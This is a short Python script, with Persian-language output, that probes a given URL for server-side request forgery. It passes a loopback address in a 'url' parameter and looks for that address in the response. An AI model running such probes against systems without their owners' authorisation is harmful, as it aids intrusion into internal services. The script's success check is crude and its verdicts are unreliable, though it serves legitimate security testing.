import sys
import requests
from utils.error_handler import log_info, log_error
from termcolor import colored

def exploit_ssrf(url):
    test_url = 'http://127.0.0.1:80/'
    try:
        r = requests.get(url, params={'url': test_url}, timeout=10)
        if 'localhost' in r.text or '127.0.0.1' in r.text:
            print(colored(f'[+] SSRF موفقیت‌آمیز در {url}', 'green'))
            log_info(f'SSRF at {url}')
        else:
            print(colored(f'[-] SSRF در {url} تأیید نشد', 'yellow'))
    except Exception as e:
        log_error(str(e))
        print(colored(f'[!] خطا: {e}', 'red'))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 ssrf.py <url>')
        sys.exit(1)
    exploit_ssrf(sys.argv[1])